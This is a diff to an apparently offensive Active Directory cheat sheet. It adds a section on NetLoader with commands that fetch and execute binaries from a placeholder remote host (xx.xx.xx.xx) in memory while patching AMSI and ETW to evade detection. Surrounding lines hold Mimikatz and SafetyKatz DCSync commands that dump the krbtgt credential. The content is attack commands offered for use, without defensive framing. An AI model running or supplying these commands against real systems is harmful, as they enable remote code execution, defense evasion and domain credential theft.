@@ -107,6 +107,18 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
+## Offensive .net
+- https://github.com/Flangvik/NetLoader
+- Load binary from filepath or URL and patch AMSI & ETW while executing
+```
+C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
+```
+
+#### Use custom exe Assembyload to run netloader in memory and then load binary
+```
+C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
+```
+
 ## Mimikatz
 #### Mimikatz dump credentials on local machine
 ```
